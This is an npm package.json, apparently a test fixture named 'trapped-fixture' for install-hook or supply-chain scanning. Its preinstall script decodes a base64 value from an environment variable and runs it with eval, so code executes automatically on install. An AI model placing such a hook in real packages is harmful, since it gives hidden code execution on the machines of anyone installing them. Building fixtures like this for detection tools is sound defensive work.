{
  "name": "trapped-fixture",
  "version": "0.0.0",
  "private": true,
  "scripts": {
    "preinstall": "node -e \"eval(Buffer.from(process.env.X||'','base64').toString())\"",
    "postinstall": "node scripts/setup.js",
    "prepublishOnly": "npm run build",
    "test": "vitest"
  },
  "dependencies": {
    "left-pad": "^1.3.0",
    "internal-tools": "git+https://github.example.test/acme/internal-tools.git#main"
  }
}
